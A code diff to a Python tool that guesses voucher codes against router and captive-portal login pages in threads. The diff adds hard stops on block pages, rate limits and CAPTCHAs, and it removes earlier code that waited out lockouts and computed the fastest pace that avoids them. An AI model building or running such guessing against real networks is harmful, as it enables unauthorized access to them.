@@ -18,6 +18,7 @@ import json
 import os
 import queue
 import random
+import re
 import threading
 import time
 from collections import Counter, deque
@@ -80,6 +81,7 @@ def _without_query_fields(url: str, names) -> str:
     Preserve routing/token parameters, but replace fields we submit ourselves.
     """
     try:
+        url = portals.sanitize_login_url(url)
         parts = urlsplit(url)
         remove = {str(n) for n in names if n}
         query = [(k, v) for k, v in parse_qsl(parts.query,
@@ -233,6 +235,19 @@ def warm_up(session, p: dict, tries: int = 2) -> dict:
     return None
 
 
+def _is_protective_reply(resp, login_url: str) -> tuple:
+    """Return (stop, evidence) for explicit blocks, limits, or CAPTCHA pages."""
+    if resp.status in (403, 429):
+        return True, f"HTTP {resp.status}"
+    raw = (resp.text or "").lower()
+    if any(word in raw for word in ("captcha", "g-recaptcha", "hcaptcha")):
+        return True, "captcha_challenge"
+    word = find_phrase(raw, config.BAN_WORDS)
+    if word and not portals.parse_form(resp.text or "", login_url).inputs:
+        return True, word
+    return False, word
+
+
 # ---------------------------------------------------------------------------
 # calibration
 # ---------------------------------------------------------------------------
@@ -340,18 +355,16 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
         # "slow down" in a warning) - calling that a block used to stop every
         # run on networks that were perfectly reachable.  A real block page
         # replaces the form.
-        page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)
-        # note: parse_form() always *names* a user field (it falls back to
-        # "username"), so the honest question is whether it FOUND inputs
-        has_form = bool(portals.parse_form(resp.text or "",
-                                           p["login_url"]).inputs)
-        if resp.status in (403, 429) or (page_word and not has_form):
-            cal.error = "blocked_already"
-            cal.step("reach_login_page", False, "blocked_before_probes",
-                     {"status": resp.status, "word": page_word,
-                      "has_form": has_form,
-                      "advice": "reconnect_or_restart_router"})
+        page_block, page_evidence = _is_protective_reply(resp, p["login_url"])
+        if page_block:
+            is_challenge = page_evidence == "captcha_challenge"
+            cal.error = "captcha_challenge" if is_challenge else "blocked_already"
+            cal.step("reach_login_page", False,
+                     "captcha_challenge" if is_challenge else "blocked_before_probes",
+                     {"status": resp.status, "word": page_evidence,
+                      "advice": "stop_and_contact_network_admin"})
             return cal
+        page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)
         cal.step("reach_login_page", True,
                  "http_ok_word_ignored" if page_word else "http_ok",
                  {"status": resp.status, "ms": round(ms),
@@ -384,6 +397,17 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                 return cal
             probe_cards.append(card)
             replies.append(r)
+            protective, evidence = _is_protective_reply(r, p["login_url"])
+            if protective:
+                cal.error = ("captcha_challenge" if evidence == "captcha_challenge"
+                             else "blocked_already")
+                cal.step("rejection_baseline", False,
+                         "captcha_challenge" if evidence == "captcha_challenge"
+                         else "blocked_by_our_probes",
+                         {"advice": "stop_and_contact_network_admin",
+                          "status": r.status, "word": evidence,
+                          "probes_sent": len(replies)})
+                return cal
             # Rejection pages often rotate a one-use CSRF token.  A browser
             # renders the returned form and submits its new value next; do the
             # same instead of reusing the token from the first page.
@@ -396,32 +420,6 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             # report unverified nonsense instead of saying what happened.
             cal.error = "no_rejection_baseline"
             cal.step("rejection_baseline", False, "no_probe_reply", {})
-            return cal
-
-        # 403/429 or an explicit block page means the router is refusing us
-        # before we even start.  A bare 503 is only a busy router/RADIUS, so it
-        # is NOT treated as a block here - the run just slows down on it.
-        block_status = [s.status for s in replies if s.status in (403, 429)]
-        block_word, block_form = "", False
-        for r in replies:
-            block_word = find_phrase((r.text or "").lower(), config.BAN_WORDS)
-            if block_word:
-                # same rule as above: a reply that still carries the login
-                # form is a rejection page that happens to warn about
-                # blocking, not the router locking us out
-                block_form = bool(portals.parse_form(r.text or "",
-                                                     p["login_url"]).inputs)
-                break
-        if block_status or (block_word and not block_form):
-            # The login page was fine a moment ago and the router locked us
-            # after the test cards: that is OUR lockout (it usually expires),
-            # not a router that refuses this device since before.
-            cal.error = "blocked_already"
-            cal.step("rejection_baseline", False, "blocked_by_our_probes",
-                     {"advice": "wait_then_retry_with_fewer_probes",
-                      "status": block_status[:3], "word": block_word,
-                      "has_form": block_form, "probes_sent": len(replies),
-                      "wait_seconds": config.BLOCK_WAIT_SECONDS})
             return cal
 
         # 400/405/415/422 means the endpoint rejected the *request*, not the
@@ -557,7 +555,7 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
                                   methods.index(x[0]), dsts.index(x[1]),
                                   modes.index(x[2])))
 
-    for method, dst, mode in candidates:
+    for method, dst, mode in candidates[:config.KNOWN_CARD_TRIAL_LIMIT]:
         trial = dict(p)
         trial["pass_mode"] = mode
         trial["dst_value"] = dst
@@ -565,8 +563,13 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
         judge = Judge(fp, p["login_url"])
         try:
             r = send_login(session, trial, known_card)
-        except Exception:                                # noqa: BLE001
-            continue
+        except Exception as exc:                         # noqa: BLE001
+            err = classify(exc, trial.get("login_url", ""))
+            trials.append({"mode": mode, "method": method, "dst": dst,
+                           "code": err.kind.upper(), "reason": err.kind,
+                           "status": None, "location": "", "word": ""})
+            # More request shapes cannot fix a transport failure.
+            break
         verdict = judge.classify(r, submitted_values(trial, known_card))
         body = (r.text or "").lower()
         # Keep this session's fresh hidden token/cookie pair.  Some portals
@@ -579,6 +582,9 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
             "word": (verdict.data or {}).get("word")
                     or find_phrase(body, config.REJECT_WORDS)
                     or find_phrase(body, config.BAN_WORDS)})
+        if verdict.code in ("BANNED", "RATE_LIMITED", "CHALLENGE") or r.status in (403, 429):
+            # A real lockout is a hard stop, not a cue to keep trying shapes.
+            break
         evidence = 0.0
         if r.is_redirect():
             host = (r.location.split("//")[-1].split("/")[0] or "").lower()
@@ -634,10 +640,10 @@ def calibration_retryable(error: str) -> bool:
 
 
 def block_caused_by_probes(cal) -> bool:
-    """True when the router locked us *because of* our test cards.
+    """True when the router returned a block page during our test cards.
 
-    A block page that was already there needs a new IP or a router restart;
-    one we caused ourselves usually expires on its own.
+    This is recorded for diagnosis only; the engine never waits out or retries
+    an explicit router/network block.
     """
     if (cal.error or "") != "blocked_already":
         return False
@@ -661,6 +667,14 @@ def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
         t0 = time.time()
         try:
             r = session.get(p["login_url"], allow_redirects=True)
+            blocked, evidence = _is_protective_reply(r, p["login_url"])
+            if blocked:
+                step("reach", False, "blocked_before_diagnostic_probes",
+                     {"status": r.status, "evidence": evidence})
+                out["advice"].append({"reason": "blocked_already",
+                                      "fix": "stop_and_contact_network_admin"})
+                out["ok"] = False
+                return out
             p = absorb_form(p, r.text or "", r.url or p["login_url"])
             step("reach", True, "http_ok", {"status": r.status,
                                             "ms": round((time.time()-t0)*1000)})
@@ -675,17 +689,27 @@ def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
              f"internet_{out['internet']['state'].lower()}",
              {k: v for k, v in out["internet"].items() if k != "state"})
 
-        # latency + error sample: one at a time, then the requested load
-        seq = _sample(session, p, 20, 1)
+        # Keep the complete diagnostic under a small global attempt budget.
+        # If the sequential sample gets a block reply, do not start parallel
+        # requests at all.
+        use_threads = max(1, threads or config.DEFAULT_THREADS)
+        seq_count = max(1, config.DIAGNOSTIC_SAMPLE_LIMIT // 2)
+        seq = _sample(session, p, seq_count, 1)
         out["latency"]["sequential"] = seq
         step("sample_single", seq["errors"] == 0 or seq["error_rate"] < 5,
              "ok" if seq["errors"] == 0 else "errors_present", seq)
 
-        use_threads = threads or config.DEFAULT_THREADS
-        par = _sample(session, p, max(30, use_threads * 3), use_threads)
+        remaining = max(0, config.DIAGNOSTIC_SAMPLE_LIMIT - seq["sent"])
+        if seq.get("banned") or remaining == 0:
+            par = {"sent": 0, "errors": 0, "codes": {}, "kinds": {},
+                   "banned": 0, "lat": [], "error_rate": 0.0,
+                   "avg_ms": 0, "p95_ms": 0, "skipped_after_block": bool(seq.get("banned"))}
+        else:
+            par = _sample(session, p, remaining, use_threads)
         out["latency"]["parallel"] = par
         step("sample_parallel", par["error_rate"] < 20,
-             "ok" if par["error_rate"] < 10 else "errors_rising", par)
+             "skipped_after_block" if par.get("skipped_after_block") else
+             ("ok" if par["error_rate"] < 10 else "errors_rising"), par)
 
         ban_seen = par.get("banned", 0) + seq.get("banned", 0)
         step("ban_check", ban_seen == 0,
@@ -693,7 +717,7 @@ def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
              {"ban_pages": ban_seen})
         if ban_seen:
             out["advice"].append({"reason": "blocked_already",
-                                  "fix": "restart_router_or_reconnect"})
+                                  "fix": "stop_and_contact_network_admin"})
         if par["error_rate"] > 20 and seq["error_rate"] <= 5:
             rec = max(2, use_threads // 3)
             out["advice"].append({"reason": "router_pressure",
@@ -715,12 +739,16 @@ def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
     session for each card loses the page cookie and CSRF token and measures
     "bad request" rather than router capacity.
     """
-    cards = [c for c in bench_cards(p, count)]
+    cards = [c for c in bench_cards(p, max(0, min(int(count),
+                                                   config.DIAGNOSTIC_SAMPLE_LIMIT)))]
     stats = {"sent": 0, "errors": 0, "codes": Counter(), "kinds": Counter(),
              "banned": 0, "lat": []}
     lock = threading.Lock()
+    halt = threading.Event()
 
     def one(sess, live, card):
+        if halt.is_set():
+            return live
         if live is None:
             with lock:
                 stats["sent"] += 1
@@ -737,14 +765,15 @@ def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
                 stats["errors"] += 1
                 stats["kinds"][err.kind] += 1
             return live
+        blocked, _evidence = _is_protective_reply(r, live["login_url"])
         fresh = absorb_form(live, r.text or "", r.url or live["login_url"])
         with lock:
             stats["sent"] += 1
             stats["lat"].append(round((time.time() - t0) * 1000))
             stats["codes"][r.status] += 1
-            low = (r.text or "").lower()
-            if find_phrase(low, config.BAN_WORDS):
+            if blocked:
                 stats["banned"] += 1
+                halt.set()
         return fresh
 
     if threads <= 1:
@@ -759,9 +788,23 @@ def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
         def worker():
             sess = new_session(for_attack=True,
                                headers=browser_headers(p, p["login_url"]))
-            live = warm_up(sess, p)
             try:
-                while True:
+                try:
+                    page = sess.get(p["login_url"], allow_redirects=True)
+                except Exception:                       # noqa: BLE001
+                    page = None
+                if page is not None:
+                    blocked, _evidence = _is_protective_reply(page, p["login_url"])
+                    if blocked:
+                        halt.set()
+                        with lock:
+                            stats["banned"] += 1
+                        return
+                    live = absorb_form(p, page.text or "",
+                                       page.url or p["login_url"])
+                else:
+                    live = None
+                while not halt.is_set():
                     try:
                         card = q.get_nowait()
                     except queue.Empty:
@@ -791,6 +834,36 @@ def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
 # ---------------------------------------------------------------------------
 # the attack engine
 # ---------------------------------------------------------------------------
+_REPORT_SECRET_FIELD = re.compile(
+    r"(pass|pwd|pin|user|card|voucher|token|csrf|nonce|session|chap|"
+    r"challenge|cookie|auth|secret|otp)", re.I)
+
+
+def safe_profile_snapshot(profile: dict) -> dict:
+    """Keep debugging shape while removing reusable credentials/live tokens."""
+    safe = store.migrate(profile or {})
+    safe["login_url"] = portals.sanitize_login_url(
+        safe.get("login_url", ""), safe.get("user_field", "username"),
+        safe.get("pass_field", "password"))
+    if safe.get("pass_fixed"):
+        safe["pass_fixed"] = "[redacted]"
+    chap = safe.get("chap")
+    if isinstance(chap, dict):
+        safe["chap"] = {
+            "field": chap.get("field") or safe.get("pass_field", "password"),
+            "id_present": bool(chap.get("id")),
+            "challenge_present": bool(chap.get("challenge")),
+            "values_redacted": True,
+        }
+    extras = safe.get("extra_fields") or {}
+    safe["extra_fields"] = {
+        str(name): ("[redacted]" if _REPORT_SECRET_FIELD.search(str(name))
+                    and value not in (None, "") else value)
+        for name, value in extras.items()
+    }
+    return safe
+
+
 class Engine:
     """Threaded guessing with live events. One instance per web session."""
 
@@ -832,8 +905,6 @@ class Engine:
         self._since_check = []      # cards sent since the last check
         self._watch_thread = None
         self._internet_opened = None   # set when the wall came down mid-run
-        self._pause_until = 0.0     # "the router asked us to wait"
-        self._banned_wait_count = 0  # how many lockouts we already sat out
         self._rate_count = 0
         self._unknown_saved = 0
         self._rejected_since_emit = 0
@@ -868,10 +939,13 @@ class Engine:
             self.progress["attempts"] = processed   # cards really tried
             progress = dict(self.progress)
             progress.setdefault("queued", processed)
+            planned = max(0, int(progress.get("total") or 0))
+            progress["percent"] = round(
+                min(100.0, processed / max(planned, 1) * 100), 1)
             self.speed = processed / elapsed if elapsed > 0.05 else 0.0
-            # how long the rest of this run will take at the pace we are
-            # going - the one number a user waiting on a phone really wants
-            left = max(0, (progress.get("total") or 0) - processed)
+            # Retries count as requests, but may exceed the planned unique-card
+            # count. Clamp the remainder so ETA/percent never go negative/over 100.
+            left = max(0, planned - min(processed, planned))
             progress["eta_seconds"] = (round(left / self.speed)
                                        if self.speed > 0.05 else 0)
             progress["threads"] = len((self._pool or {}).get("threads", []))
@@ -955,8 +1029,6 @@ class Engine:
         self.throttle.update({"delay_ms": int(delay_ms), "base_ms": int(delay_ms),
                               "reason": "", "events": []})
         self._ban_count = self._rate_count = self._unknown_saved = 0
-        self._pause_until = 0.0
-        self._banned_wait_count = 0
         self._recent.clear()
         self._since_check = []
         self._internet_opened = None
@@ -971,7 +1043,8 @@ class Engine:
         pos = max(0, int(p.get("space_pos", 0)))
         total = int(attempts)
         if space:
-            total = min(total, max(space - (pos % space), 0)) or int(attempts)
+            remaining = space - (pos % space)
+            total = min(total, remaining)
         self.progress = {"attempts": 0, "queued": 0, "dropped": 0,
                          "total": total, "covered": min(pos, space),
                          "space": space, "percent": 0.0}
@@ -1000,27 +1073,16 @@ class Engine:
                 cal = calibrate(p, known_card=known_card, keyword=keyword,
                                 checks=self.checks,
                                 probes=config.CALIBRATION_PROBES)
-            if not cal.ok and block_caused_by_probes(cal):
-                # Our own test cards filled the router's failure counter.  The
-                # lockout is usually temporary: wait it out, then try again
-                # with fewer cards so we do not refill it.
-                self.emit("block_wait",
-                          {"seconds": config.BLOCK_WAIT_SECONDS,
-                           "cause": "our_test_cards"})
-                self._wait(config.BLOCK_WAIT_SECONDS)
-                if self.stop_event.is_set():
-                    self.state, self.error = "done", "user_stop"
-                    self.stop_reason = "user_stop"
-                    self.finished_at = time.time()
-                    self.emit("state", {"state": "done",
-                                        "stop_reason": self.stop_reason})
-                    return
-                cal = calibrate(p, known_card=known_card, keyword=keyword,
-                                checks=self.checks,
-                                probes=config.CALIBRATION_PROBES_RETRY)
+            known_card_failure = False
+            if known_card:
+                shape_step = next((item for item in cal.steps
+                                   if item.get("id") == "shape_tuned"), None)
+                known_card_failure = bool(shape_step and not shape_step.get("ok"))
+                if known_card_failure and not cal.error:
+                    cal.error = shape_step.get("reason") or "known_card_not_proven"
             self.calibration = cal.as_dict()
             self.emit("calibration", self.calibration)
-            if not cal.ok:
+            if not cal.ok or known_card_failure:
                 self.state, self.error = "done", cal.error or "calibration_failed"
                 self.stop_reason = "calibration_failed"
                 self.finished_at = time.time()
@@ -1130,8 +1192,12 @@ class Engine:
 
             sent = 0
             pos = start_pos
+            # `total` is the number of distinct cards remaining in this walk
+            # pass, not the larger user request and never includes a wrap into
+            # cards already covered earlier in the pass.
+            planned = min(int(attempts), int(self.progress.get("total") or 0))
             try:
-                while sent < attempts and not self.stop_event.is_set():
+                while sent < planned and not self.stop_event.is_set():
                     card = store.card_at_walk_pos(self.profile, pos)
                     # bounded put: a stopped run must never hang here
                     while not self.stop_event.is_set():
@@ -1146,8 +1212,8 @@ class Engine:
                     sent += 1
                     with self.lock:
                         self.progress["queued"] = sent
-                        self.progress["percent"] = round(
-                            sent / max(self.progress["total"], 1) * 100, 1)
+                        self.progress["percent"] = round(min(
+                            100.0, sent / max(self.progress["total"], 1) * 100), 1)
                     if space and pos - start_pos >= space:
                         break
             except KeyboardInterrupt:
@@ -1233,7 +1299,6 @@ class Engine:
     # -- one attempt -----------------------------------------------------
     def _attempt(self, sess, judge, card: str, sent_index: int,
                  profile: dict = None) -> None:
-        self._wait_pause()
         if self.stop_event.is_set():
             return
         p = profile or self.profile
@@ -1658,13 +1723,6 @@ class Engine:
             target=watch, daemon=True, name="kirapass-watchdog")
         self._watch_thread.start()
 
-    def _wait_pause(self) -> None:
-        """Sit still while the router's lockout runs out."""
-        while not self.stop_event.is_set():
-            if time.time() >= getattr(self, "_pause_until", 0):
-                return
-            time.sleep(0.3)
-
     def _check_stop_rules(self) -> None:
         """Stop only for reasons we can explain."""
         counters = self.counters
@@ -1672,31 +1730,14 @@ class Engine:
         attempts = sum(counters.values())
         if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:
             self.stop("target_unreachable")
-        if (self._ban_count >= 3 and
-                self._banned_wait_count < config.BLOCK_PATIENCE):
-            # The router locked us out.  On a network we are allowed to test
-            # the lockout is temporary, so we sit through it ONCE and then go
-            # on slowly - hammering a router that is asking us to slow down
-            # only makes the next lockout longer.
-            self._banned_wait_count += 1
-            self._ban_count = 0
-            measured = int(self.profile.get("clears_after") or 0)
-            wait = (measured + 2) if measured else config.BLOCK_WAIT_SECONDS
-            self._pause_until = time.time() + wait
-            with self.lock:
-                self.throttle["delay_ms"] = max(
-                    self.throttle["delay_ms"], config.BAN_COOLDOWN_MS)
-                self.throttle["reason"] = "banned_waiting"
-            self.emit("block_wait", {"seconds": wait,
-                                     "cause": "router_lockout",
-                                     "measured": measured})
-            self.emit("throttle", {"reason": "banned_waiting",
-                                   "delay_ms": self.throttle["delay_ms"]})
-            return
-        if self._ban_count >= 3:
+        # Treat the router's first explicit lockout/rate-limit response as a
+        # hard stop. Never wait it out and resume probing automatically.
+        if self._ban_count >= 1:
             self.stop("banned_by_router")
-        if self._rate_count >= 5:
+            return
+        if self._rate_count >= 1:
             self.stop("rate_limited_by_router")
+            return
         if counters.get("CHALLENGE", 0) >= 1:
             self.stop("captcha_challenge")
 
@@ -1721,7 +1762,7 @@ class Engine:
             "calibration": self.calibration,
             "internet_opened": self._internet_opened,
             "review_files": [r.get("file") for r in self.review],
-            "profile_snapshot": {k: v for k, v in self.profile.items()},
+            "profile_snapshot": safe_profile_snapshot(self.profile),
         }
         try:
             path = self.store.save_run(report)
@@ -1755,13 +1796,11 @@ def _retry_after(resp) -> int:
 def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                   wait_limit: float = 240.0, step: float = 10.0,
                   pace: float = 0.4, log=None) -> dict:
-    """How many failed logins does this router take before it locks us out,
-    and how long does the lockout last?
+    """Run a capped, explicit diagnostic and stop at the first protective reply.
 
-    This is the honest answer to "the router keeps blocking me": instead of
-    trying to sneak past the protection we measure it, and the answer tells
-    the user the fastest pace that does not trip it - or that guessing on
-    this router is simply not possible.
+    The legacy wait_limit and step parameters are accepted for API compatibility
+    but intentionally ignored: this diagnostic never waits for expiry or tests
+    another card after a block, rate limit, or CAPTCHA.
     """
     p = store.migrate(profile)
     say = log or (lambda *a, **k: None)
@@ -1792,27 +1831,24 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
         p = absorb_form(p, resp.text or "", p["login_url"])
 
         def blocked(r) -> tuple:
-            """(is it a block page, matched word)"""
-            word = find_phrase((r.text or "").lower(), config.BAN_WORDS)
-            form = bool(portals.parse_form(r.text or "", p["login_url"]).inputs)
-            if r.status in (403, 429):
-                return True, word or f"HTTP {r.status}"
-            if word and not form:
-                return True, word
-            return False, ""
+            """Protective block/rate-limit/CAPTCHA page, with evidence."""
+            return _is_protective_reply(r, p["login_url"])
 
         is_block, word = blocked(resp)
         if is_block:
-            out["error"] = "blocked_from_the_start"
-            step_row("reach_login_page", False, "blocked_from_the_start",
+            out["error"] = ("captcha_challenge" if word == "captcha_challenge"
+                            else "blocked_from_the_start")
+            step_row("reach_login_page", False, out["error"],
                      {"status": resp.status, "word": word})
             return out
         step_row("reach_login_page", True, "http_ok", {"status": resp.status})
 
-        # --- 1. how many failures before it says no? ---------------------
+        # --- 1. bounded, opt-in check; stop at the first block reply ------
         space = store.space_size(p)
+        limit = max(0, min(int(max_failures), config.LOCKOUT_PROBE_MAX_FAILURES))
+        out["max_failures"] = limit
         failures = 0
-        for i in range(int(max_failures)):
+        for i in range(limit):
             card = store.decode_card(p, i % space)
             try:
                 r = send_login(session, p, card)
@@ -1823,65 +1859,30 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                          {"text": err.text[:160], "failures": failures})
                 return out
             failures += 1
-            p = absorb_form(p, r.text or "", r.url or p["login_url"])
             is_block, word = blocked(r)
             if is_block:
-                # the attempt that got the block page was not judged, so the
-                # number this router really forgives is one less
+                # The request returning the protective page was not judged.
+                # Record it and stop; never poll for expiry or test another card.
+                out["tried"] = failures
+                if word == "captcha_challenge":
+                    out["error"] = "captcha_challenge"
+                    step_row("failures", False, "captcha_challenge",
+                             {"failures": failures, "status": r.status})
+                    return out
                 out["ban_after"] = max(0, failures - 1)
+                out["ok"] = True
                 step_row("failures", True, "blocked_after",
                          {"failures": failures, "forgiven": out["ban_after"],
                           "status": r.status, "word": word})
-                break
-            time.sleep(pace)
+                step_row("recovery", False, "not_probed_after_lockout",
+                         {"advice": "stop_and_contact_network_admin"})
+                return out
+            p = absorb_form(p, r.text or "", r.url or p["login_url"])
+            time.sleep(max(0.0, min(float(pace), 1.0)))
         out["tried"] = failures
-        if out["ban_after"] is None:
-            out["ok"] = True
-            step_row("failures", True, "never_blocked", {"failures": failures})
-            return out
-
-        # --- 2. and when does the door open again? -----------------------
-        started = time.time()
-        trial_i = int(max_failures)
-        while time.time() - started < wait_limit:
-            time.sleep(step)
-            try:
-                again = session.get(p["login_url"], allow_redirects=True)
-            except Exception:                           # noqa: BLE001
-                continue
-            is_block, word = blocked(again)
-            if not is_block:
-                p = absorb_form(p, again.text or "",
-                                again.url or p["login_url"])
-                # Some routers keep serving the login page and only show the
-                # block page when you actually try a card - so ask with one
-                # wrong card.  A reply we cannot read is not a lockout.
-                try:
-                    trial = send_login(session, p,
-                                       store.decode_card(p, trial_i % space))
-                except Exception:                       # noqa: BLE001
-                    continue
-                trial_i += 1
-                p = absorb_form(p, trial.text or "",
-                                trial.url or p["login_url"])
-                is_block, word = blocked(trial)
-            if not is_block:
-                out["clears_after"] = round(time.time() - started)
-                out["ok"] = True
-                step_row("recovery", True, "cleared",
-                         {"seconds": out["clears_after"], "trials": trial_i})
-                break
-        out["waited"] = round(time.time() - started)
-        if out["clears_after"] is None:
-            out["ok"] = True
-            step_row("recovery", False, "still_blocked",
-                     {"waited": out["waited"]})
-
-        # --- 3. the fastest pace that stays under the limit --------------
-        if out["clears_after"] and out["ban_after"]:
-            # ban_after failures are forgiven every clears_after seconds
-            out["safe_delay_ms"] = int(
-                max(1000.0, out["clears_after"] * 1000.0 / out["ban_after"]))
+        out["ok"] = True
+        step_row("failures", True, "no_block_within_safe_limit",
+                 {"failures": failures, "limit": limit})
         return out
     finally:
         session.close()
